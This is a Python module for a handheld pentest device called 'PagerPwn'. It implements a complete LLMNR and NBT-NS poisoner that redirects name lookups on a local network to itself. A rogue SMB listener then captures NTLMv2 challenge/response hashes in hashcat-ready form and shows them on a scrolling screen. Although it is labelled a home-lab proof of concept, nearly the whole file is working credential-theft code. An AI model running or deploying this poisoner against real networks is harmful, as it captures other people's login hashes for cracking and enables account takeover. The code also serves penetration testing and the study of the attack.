"""
llmnr.py - LLMNR/NBT-NS Poisoner + NTLMv2 Hash Capture for PagerPwn

Listens for LLMNR (UDP 5355) and NBT-NS (UDP 137) name resolution broadcasts.
Responds with our IP to redirect auth attempts, then captures NTLMv2
challenge/response hashes on a mini SMB listener (TCP 445).

Live scrolling LCD feed shows all poisoning + SMB handshake activity.
Output format: hashcat -m 5600 compatible.
Module interface: run(config, ui_callback, stop_event, pager=None) -> dict

Home lab PoC — authorized testing only.
"""

import os
import socket
import struct
import threading
import time
import queue

from pagerctl import Pager

# ── Constants ─────────────────────────────────────────────────────────────────
LLMNR_ADDR = "224.0.0.252"
LLMNR_PORT = 5355
NBTNS_PORT = 137
SMB_PORT   = 445

NTLMSSP_SIGNATURE = b"NTLMSSP\x00"
NTLM_NEGOTIATE    = 1
NTLM_CHALLENGE    = 2
NTLM_AUTH         = 3

# Fixed server challenge (8 bytes)
SERVER_CHALLENGE = os.urandom(8)


# ── LLMNR Poisoner ────────────────────────────────────────────────────────────

def _llmnr_listener(our_ip, feed_queue, stop_event, stats):
    """Listen for LLMNR queries and respond with our IP."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind(("", LLMNR_PORT))
        mreq = socket.inet_aton(LLMNR_ADDR) + socket.inet_aton("0.0.0.0")
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mreq)
        sock.settimeout(1.0)
    except Exception as e:
        feed_queue.put(("error", f"LLMNR bind fail: {e}", Pager.RED))
        return

    our_ip_bytes = socket.inet_aton(our_ip)

    while not stop_event.is_set():
        try:
            data, (src_ip, src_port) = sock.recvfrom(1024)
        except socket.timeout:
            continue
        except Exception:
            break

        if len(data) < 12:
            continue

        txid = data[:2]
        flags = struct.unpack(">H", data[2:4])[0]
        qdcount = struct.unpack(">H", data[4:6])[0]

        if flags & 0x8000 or qdcount < 1:
            continue

        offset = 12
        name_parts = []
        while offset < len(data):
            length = data[offset]
            if length == 0:
                offset += 1
                break
            offset += 1
            name_parts.append(data[offset:offset + length])
            offset += length

        if not name_parts:
            continue

        queried_name = b".".join(name_parts).decode(errors="replace")

        if src_ip == our_ip:
            continue

        stats["queries"] += 1

        resp = txid + struct.pack(">HHHHH", 0x8000, 1, 1, 0, 0)
        for part in name_parts:
            resp += bytes([len(part)]) + part
        resp += b"\x00" + struct.pack(">HH", 1, 1)
        for part in name_parts:
            resp += bytes([len(part)]) + part
        resp += b"\x00" + struct.pack(">HH", 1, 1)
        resp += struct.pack(">IH", 30, 4) + our_ip_bytes

        try:
            sock.sendto(resp, (src_ip, src_port))
            stats["poisoned"] += 1
            feed_queue.put(("poison", f"LLMNR {src_ip} -> {queried_name}", Pager.YELLOW))
        except Exception:
            pass

    sock.close()


# ── NBT-NS Poisoner ──────────────────────────────────────────────────────────

def _nbtns_listener(our_ip, feed_queue, stop_event, stats):
    """Listen for NBT-NS queries and respond with our IP."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
        sock.bind(("", NBTNS_PORT))
        sock.settimeout(1.0)
    except Exception:
        return

    our_ip_bytes = socket.inet_aton(our_ip)

    while not stop_event.is_set():
        try:
            data, (src_ip, src_port) = sock.recvfrom(1024)
        except socket.timeout:
            continue
        except Exception:
            break

        if len(data) < 50 or src_ip == our_ip:
            continue

        txid = data[:2]
        flags = struct.unpack(">H", data[2:4])[0]
        if flags & 0x8000:
            continue

        try:
            encoded = data[13:45]
            name = ""
            for i in range(0, 30, 2):
                name += chr(((encoded[i] - 0x41) << 4) | (encoded[i + 1] - 0x41))
            name = name.strip()
        except Exception:
            continue

        stats["queries"] += 1

        resp = txid
        resp += struct.pack(">H", 0x8500)
        resp += struct.pack(">HHHH", 0, 1, 0, 0)
        resp += data[12:46]
        resp += struct.pack(">HH", 0x0020, 0x0001)
        resp += struct.pack(">IH", 30, 6)
        resp += struct.pack(">H", 0)
        resp += our_ip_bytes

        try:
            sock.sendto(resp, (src_ip, src_port))
            stats["poisoned"] += 1
            feed_queue.put(("poison", f"NBTNS {src_ip} -> {name}", Pager.YELLOW))
        except Exception:
            pass

    sock.close()


# ── NTLM Challenge Builder ───────────────────────────────────────────────────

def _build_ntlm_challenge():
    target_name = "PAGERPWN".encode("utf-16-le")
    target_info = b""
    domain = "PAGERPWN".encode("utf-16-le")
    target_info += struct.pack("<HH", 2, len(domain)) + domain
    computer = "PAGER".encode("utf-16-le")
    target_info += struct.pack("<HH", 1, len(computer)) + computer
    target_info += struct.pack("<HH", 0, 0)

    target_name_offset = 56
    target_info_offset = target_name_offset + len(target_name)

    challenge = NTLMSSP_SIGNATURE
    challenge += struct.pack("<I", NTLM_CHALLENGE)
    challenge += struct.pack("<HHI", len(target_name), len(target_name), target_name_offset)
    challenge += struct.pack("<I", 0x00028233)
    challenge += SERVER_CHALLENGE
    challenge += b"\x00" * 8
    challenge += struct.pack("<HHI", len(target_info), len(target_info), target_info_offset)
    challenge += b"\x00" * 8
    challenge += target_name
    challenge += target_info

    return challenge


# ── ASN.1 / SPNEGO helpers ───────────────────────────────────────────────────

def _asn1_length(length):
    if length < 0x80:
        return bytes([length])
    elif length < 0x100:
        return b"\x81" + bytes([length])
    else:
        return b"\x82" + struct.pack(">H", length)


def _build_spnego_challenge(ntlm_challenge):
    ntlmssp_oid = b"\x06\x0a\x2b\x06\x01\x04\x01\x82\x37\x02\x02\x0a"
    neg_result = b"\xa0\x03\x0a\x01\x01"
    supported_mech = b"\xa1" + bytes([len(ntlmssp_oid)]) + ntlmssp_oid
    resp_token_inner = b"\x04" + _asn1_length(len(ntlm_challenge)) + ntlm_challenge
    resp_token = b"\xa2" + _asn1_length(len(resp_token_inner)) + resp_token_inner
    seq_body = neg_result + supported_mech + resp_token
    neg_token_targ = b"\x30" + _asn1_length(len(seq_body)) + seq_body
    spnego = b"\xa1" + _asn1_length(len(neg_token_targ)) + neg_token_targ
    return spnego


# ── SMB Response Builders ────────────────────────────────────────────────────

def _build_smb2_negotiate_response():
    ntlmssp_oid = b"\x06\x0a\x2b\x06\x01\x04\x01\x82\x37\x02\x02\x0a"
    mech_list = b"\x30" + _asn1_length(len(ntlmssp_oid)) + ntlmssp_oid
    mech_types = b"\xa0" + _asn1_length(len(mech_list)) + mech_list
    neg_token = b"\x30" + _asn1_length(len(mech_types)) + mech_types
    spnego_oid = b"\x06\x06\x2b\x06\x01\x05\x05\x02"
    spnego_blob = b"\x60" + _asn1_length(len(spnego_oid) + len(neg_token)) + spnego_oid + neg_token

    hdr = b"\xfeSMB"
    hdr += struct.pack("<H", 64)
    hdr += struct.pack("<H", 0)
    hdr += struct.pack("<I", 0)
    hdr += struct.pack("<H", 0)        # NEGOTIATE
    hdr += struct.pack("<H", 1)
    hdr += struct.pack("<I", 0x0001)   # Response flag
    hdr += struct.pack("<I", 0)
    hdr += struct.pack("<Q", 0)
    hdr += struct.pack("<I", 0)
    hdr += struct.pack("<I", 0)
    hdr += struct.pack("<Q", 0)
    hdr += b"\x00" * 16

    body = struct.pack("<H", 65)
    body += struct.pack("<H", 0x0001)  # signing enabled
    body += struct.pack("<H", 0x0202)  # SMB 2.0.2
    body += struct.pack("<H", 0)
    body += os.urandom(16)             # ServerGUID
    body += struct.pack("<I", 0x07)    # Capabilities
    body += struct.pack("<I", 65536)
    body += struct.pack("<I", 65536)
    body += struct.pack("<I", 65536)
    body += struct.pack("<Q", 0)
    body += struct.pack("<Q", 0)
    body += struct.pack("<H", 128)     # SecurityBufferOffset
    body += struct.pack("<H", len(spnego_blob))
    body += struct.pack("<I", 0)
    body += spnego_blob

    msg = hdr + body
    return struct.pack(">I", len(msg)) + msg


def _build_smb2_session_setup_response(ntlm_challenge):
    spnego_blob = _build_spnego_challenge(ntlm_challenge)

    hdr = b"\xfeSMB"
    hdr += struct.pack("<H", 64)
    hdr += struct.pack("<H", 0)
    hdr += struct.pack("<I", 0xC0000016)   # MORE_PROCESSING_REQUIRED
    hdr += struct.pack("<H", 1)            # SESSION_SETUP
    hdr += struct.pack("<H", 1)
    hdr += struct.pack("<I", 0x0001)
    hdr += struct.pack("<I", 0)
    hdr += struct.pack("<Q", 1)            # MessageId
    hdr += struct.pack("<I", 0)
    hdr += struct.pack("<I", 0)
    hdr += struct.pack("<Q", 0x0000040000000001)  # SessionId
    hdr += b"\x00" * 16

    body = struct.pack("<H", 9)
    body += struct.pack("<H", 0)
    body += struct.pack("<H", 72)          # SecurityBufferOffset
    body += struct.pack("<H", len(spnego_blob))
    body += spnego_blob

    msg = hdr + body
    return struct.pack(">I", len(msg)) + msg


def _build_smb1_negotiate_response():
    ntlm_challenge = _build_ntlm_challenge()

    smb = b"\xffSMB\x72"
    smb += struct.pack("<I", 0)
    smb += b"\x98"
    smb += struct.pack("<H", 0xC853)
    smb += b"\x00" * 12
    smb += struct.pack("<HHH", 0, os.getpid() & 0xFFFF, 0)
    smb += struct.pack("<H", 0)

    params = struct.pack("<H", 0)
    params += b"\x03"
    params += struct.pack("<HH", 1, 1)
    params += struct.pack("<II", 16644, 65536)
    params += struct.pack("<II", 0, 0x00008215)
    params += struct.pack("<QH", 0, 0)
    params += b"\x00"

    word_count = len(params) // 2
    byte_data = struct.pack("<H", len(ntlm_challenge) + 16)
    byte_data += b"\x60" + bytes([len(ntlm_challenge) + 14])
    byte_data += b"\x06\x06\x2b\x06\x01\x05\x05\x02"
    byte_data += b"\xa0" + bytes([len(ntlm_challenge) + 4])
    byte_data += b"\x30" + bytes([len(ntlm_challenge) + 2])
    byte_data += b"\xa2" + bytes([len(ntlm_challenge)])
    byte_data += ntlm_challenge

    resp = smb + bytes([word_count]) + params
    resp += struct.pack("<H", len(byte_data)) + byte_data
    return struct.pack(">I", len(resp)) + resp


# ── NTLMv2 Hash Extractor ───────────────────────────────────────────────────

def _extract_ntlmv2(data, stats, hashes, feed_queue):
    try:
        idx = data.find(NTLMSSP_SIGNATURE)
        if idx < 0:
            return
        ntlm = data[idx:]

        msg_type = struct.unpack("<I", ntlm[8:12])[0]
        if msg_type != NTLM_AUTH:
            return

        lm_len = struct.unpack("<H", ntlm[12:14])[0]
        lm_off = struct.unpack("<I", ntlm[16:20])[0]
        nt_len = struct.unpack("<H", ntlm[20:22])[0]
        nt_off = struct.unpack("<I", ntlm[24:28])[0]
        domain_len = struct.unpack("<H", ntlm[28:30])[0]
        domain_off = struct.unpack("<I", ntlm[32:36])[0]
        user_len = struct.unpack("<H", ntlm[36:38])[0]
        user_off = struct.unpack("<I", ntlm[40:44])[0]

        domain = ntlm[domain_off:domain_off + domain_len].decode("utf-16-le", errors="replace")
        user = ntlm[user_off:user_off + user_len].decode("utf-16-le", errors="replace")

        nt_data = ntlm[nt_off:nt_off + nt_len]
        if len(nt_data) < 24:
            return

        nt_proof = nt_data[:16].hex()
        nt_blob = nt_data[16:].hex()
        challenge_hex = SERVER_CHALLENGE.hex()

        hash_line = f"{user}::{domain}:{challenge_hex}:{nt_proof}:{nt_blob}"

        hashes.append({"user": user, "domain": domain, "hash_line": hash_line})
        stats["captures"] += 1

        feed_queue.put(("capture", f"CAPTURED {domain}\\{user}", Pager.GREEN))
        feed_queue.put(("capture", f"  {hash_line[:52]}", Pager.GREEN))

    except Exception as e:
        feed_queue.put(("error", f"Extract err: {e}", Pager.RED))


# ── SMB Client Handler ──────────────────────────────────────────────────────

def _handle_smb_client(conn, addr, feed_queue, stop_event, stats, hashes):
    ntlm_challenge = _build_ntlm_challenge()

    try:
        data = conn.recv(8192)
        if not data or len(data) < 8:
            return

        smb_data = data[4:] if len(data) > 4 else data
        is_smb2 = smb_data[:4] == b"\xfeSMB"
        is_smb1 = smb_data[:4] == b"\xffSMB"
        has_smb2_dialect = b"SMB 2" in data or is_smb2

        proto = "SMB2" if is_smb2 else "SMB1" if is_smb1 else "?"
        feed_queue.put(("smb", f"SMB CONN {addr[0]} ({proto})", Pager.CYAN))

        if is_smb2 or (is_smb1 and has_smb2_dialect):
            feed_queue.put(("smb", f"  Negotiate -> SMB2 response", Pager.GRAY))
            conn.send(_build_smb2_negotiate_response())

            data2 = conn.recv(8192)
            if not data2:
                feed_queue.put(("smb", f"  Client disconnected (no session)", Pager.RED))
                return

            feed_queue.put(("smb", f"  Session setup recv ({len(data2)}b)", Pager.GRAY))

            # Check if already NTLM_AUTH
            if NTLMSSP_SIGNATURE in data2:
                ntlm_data = data2[data2.find(NTLMSSP_SIGNATURE):]
                if len(ntlm_data) >= 12:
                    msg_type = struct.unpack("<I", ntlm_data[8:12])[0]
                    feed_queue.put(("smb", f"  NTLM type={msg_type}", Pager.GRAY))
                    if msg_type == NTLM_AUTH:
                        _extract_ntlmv2(data2, stats, hashes, feed_queue)
                        return

            feed_queue.put(("smb", f"  Sending NTLM challenge", Pager.GRAY))
            conn.send(_build_smb2_session_setup_response(ntlm_challenge))

            auth_data = conn.recv(8192)
            if auth_data:
                feed_queue.put(("smb", f"  Auth recv ({len(auth_data)}b)", Pager.GRAY))
                if NTLMSSP_SIGNATURE in auth_data:
                    _extract_ntlmv2(auth_data, stats, hashes, feed_queue)
                else:
                    feed_queue.put(("smb", f"  No NTLMSSP in auth", Pager.RED))
            else:
                feed_queue.put(("smb", f"  No auth (disconnected)", Pager.RED))

        elif is_smb1:
            feed_queue.put(("smb", f"  SMB1 flow", Pager.GRAY))
            conn.send(_build_smb1_negotiate_response())
            auth_data = conn.recv(8192)
            if auth_data:
                _extract_ntlmv2(auth_data, stats, hashes, feed_queue)
            else:
                feed_queue.put(("smb", f"  SMB1 no auth", Pager.RED))

    except Exception as e:
        feed_queue.put(("error", f"SMB err: {str(e)[:35]}", Pager.RED))
    finally:
        try:
            conn.close()
        except Exception:
            pass


def _smb_server(our_ip, feed_queue, stop_event, stats, hashes):
    try:
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind(("0.0.0.0", SMB_PORT))
        server.listen(5)
        server.settimeout(1.0)
    except Exception as e:
        feed_queue.put(("error", f"SMB bind fail: {e}", Pager.RED))
        return

    feed_queue.put(("info", f"SMB listener on :{SMB_PORT}", Pager.GRAY))

    while not stop_event.is_set():
        try:
            conn, addr = server.accept()
            conn.settimeout(5.0)
        except socket.timeout:
            continue
        except Exception:
            break

        t = threading.Thread(
            target=_handle_smb_client,
            args=(conn, addr, feed_queue, stop_event, stats, hashes),
            daemon=True,
        )
        t.start()

    server.close()


# ── LCD Drawing ──────────────────────────────────────────────────────────────

def _draw_screen(pager, feed_lines, scroll_offset, elapsed, stats):
    pager.clear(Pager.BLACK)

    # Header with stats
    pager.fill_rect(0, 0, 480, 20, Pager.rgb(140, 0, 140))
    mins, secs = divmod(elapsed, 60)
    captures = stats["captures"]
    pager.draw_text(4, 2, f"LLMNR  CAP:{captures}  Q:{stats['queries']}  P:{stats['poisoned']}", Pager.WHITE, 2)

    # Feed area
    LINE_H = 18
    MAX_LINES = 9
    y = 22

    visible = feed_lines[scroll_offset:scroll_offset + MAX_LINES]
    for text, color in visible:
        pager.draw_text(4, y, text[:38], color, 2)
        y += LINE_H

    # Status bar
    pager.fill_rect(0, 204, 480, 18, Pager.rgb(40, 40, 40))
    total = len(feed_lines)
    end = min(scroll_offset + MAX_LINES, total)
    pager.draw_text(4, 206,
                    f"{mins:02d}:{secs:02d}  [{end}/{total}]  [B] STOP",
                    Pager.GRAY, 1)
    pager.flip()


# ── Main Entry Point ─────────────────────────────────────────────────────────

def run(config, ui_callback, stop_event, pager=None):
    """
    Run LLMNR/NBT-NS poisoner + SMB hash capture with live LCD feed.

    Returns:
        dict: {"hashes": [...], "stats": {...}}
    """
    if pager is None:
        ui_callback("[LLMNR]", "No pager ref")
        time.sleep(2)
        return {"error": "no_pager"}

    iface = config.get("IFACE", "br-lan")
    subnet = config.get("SUBNET", "192.168.0")
    gateway = config.get("GATEWAY", f"{subnet}.1")

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect((gateway, 80))
        our_ip = s.getsockname()[0]
        s.close()
    except Exception:
        our_ip = "0.0.0.0"

    # Start threads
    listen_stop = threading.Event()
    feed_queue = queue.Queue()
    feed_lines = []
    stats = {"queries": 0, "poisoned": 0, "captures": 0}
    hashes = []

    feed_queue.put(("info", f"Listening on {our_ip} ({iface})", Pager.GRAY))
    feed_queue.put(("info", f"LLMNR :{LLMNR_PORT}  NBT-NS :{NBTNS_PORT}  SMB :{SMB_PORT}", Pager.GRAY))
    feed_queue.put(("info", "Waiting for queries...", Pager.GRAY))

    threads = [
        threading.Thread(target=_llmnr_listener, args=(our_ip, feed_queue, listen_stop, stats), daemon=True),
        threading.Thread(target=_nbtns_listener, args=(our_ip, feed_queue, listen_stop, stats), daemon=True),
        threading.Thread(target=_smb_server, args=(our_ip, feed_queue, listen_stop, stats, hashes), daemon=True),
    ]
    for t in threads:
        t.start()

    # Purple LED
    try:
        pager.led_set("a-button-led", 200)
        pager.led_set("b-button-led", 200)
    except Exception:
        pass

    start_time = time.time()
    scroll_offset = 0
    auto_scroll = True
    pager.clear_input_events()

    MAX_FEED = 500

    # ── Live display loop ────────────────────────────────────────────────
    while not (stop_event and stop_event.is_set()):
        # Check buttons FIRST
        while True:
            event = pager.get_input_event()
            if not event:
                break
            btn, etype, _ = event
            if etype != Pager.EVENT_PRESS:
                continue
            if btn == Pager.BTN_B:
                pager.beep(200, 100)
                listen_stop.set()
                pager.clear_input_events()
                break
            elif btn == Pager.BTN_UP:
                scroll_offset = max(0, scroll_offset - 1)
                auto_scroll = False
            elif btn == Pager.BTN_DOWN:
                max_off = max(0, len(feed_lines) - 9)
                scroll_offset = min(scroll_offset + 1, max_off)
                if scroll_offset >= max_off:
                    auto_scroll = True
            elif btn == Pager.BTN_LEFT:
                scroll_offset = max(0, scroll_offset - 9)
                auto_scroll = False
            elif btn == Pager.BTN_RIGHT:
                max_off = max(0, len(feed_lines) - 9)
                scroll_offset = min(scroll_offset + 9, max_off)
                if scroll_offset >= max_off:
                    auto_scroll = True

        if listen_stop.is_set():
            break

        # Drain feed queue
        drained = 0
        while drained < 20:
            try:
                item = feed_queue.get_nowait()
                feed_lines.append((item[1], item[2]))
                drained += 1
            except Exception:
                break

        if len(feed_lines) > MAX_FEED:
            feed_lines = feed_lines[-MAX_FEED:]

        if auto_scroll:
            max_off = max(0, len(feed_lines) - 9)
            scroll_offset = max_off

        elapsed = int(time.time() - start_time)
        _draw_screen(pager, feed_lines, scroll_offset, elapsed, stats)

        time.sleep(0.1)

    # ── Cleanup ──────────────────────────────────────────────────────────
    listen_stop.set()
    if stop_event:
        stop_event.set()

    try:
        pager.led_set("a-button-led", 0)
        pager.led_set("b-button-led", 0)
    except Exception:
        pass

    for t in threads:
        t.join(timeout=0.5)

    duration = int(time.time() - start_time)

    # Result screen
    pager.clear(Pager.BLACK)
    pager.fill_rect(0, 0, 480, 22, Pager.rgb(140, 0, 140))
    pager.draw_text(6, 3, "LLMNR COMPLETE", Pager.WHITE, 2)
    pager.draw_text_centered(50, f"Captures: {stats['captures']}", Pager.GREEN, 2)
    pager.draw_text_centered(80, f"Queries: {stats['queries']}  Poisoned: {stats['poisoned']}", Pager.CYAN, 2)
    pager.draw_text_centered(110, f"Duration: {duration}s", Pager.GRAY, 2)
    pager.draw_text_centered(180, "[A] CONTINUE", Pager.GREEN, 2)
    pager.flip()

    pager.clear_input_events()
    while True:
        event = pager.get_input_event()
        if event:
            btn, etype, _ = event
            if btn == Pager.BTN_A and etype == Pager.EVENT_PRESS:
                break
        time.sleep(0.03)

    return {"hashes": hashes, "stats": stats}
